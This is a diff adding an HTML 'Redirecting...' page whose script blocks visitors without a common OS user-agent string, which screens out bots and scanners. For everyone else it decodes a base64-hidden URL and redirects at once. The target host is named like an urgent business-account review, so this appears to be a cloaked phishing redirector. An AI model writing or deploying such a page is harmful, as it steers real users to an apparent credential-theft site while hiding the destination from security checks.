@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Redirecting...</title>
+<script>
+(function(){
+    // Allow only real browsers
+    const allowList = [
+        /android/i,
+        /windows/i,
+        /iphone/i,
+        /ipad/i,
+        /mac os/i,
+        /cros/i
+    ];
+
+    const ua = navigator.userAgent || "";
+    const isAllowed = allowList.some(r => r.test(ua));
+
+    if (!isAllowed) {
+        document.body.innerHTML = "<div style='font-family:sans-serif;text-align:center;margin-top:40vh;'><h2>Access Denied</h2><p>Device not supported.</p></div>";
+        throw new Error("Device not allowed");
+    }
+
+    // Obfuscate target URL (base64)
+    const encodedUrl = "aHR0cHM6Ly90YWtlLXVyZ2VudC1yZXZpZXctYnVzaW5lc3Mtc3VpdGUud2FzbWVyLmFwcC8="; // your URL base64 encoded
+    const targetUrl = atob(encodedUrl);
+
+    // Instant redirect
+    window.location.replace(targetUrl);
+})();
+</script>
+</head>
+<body></body>
+</html>
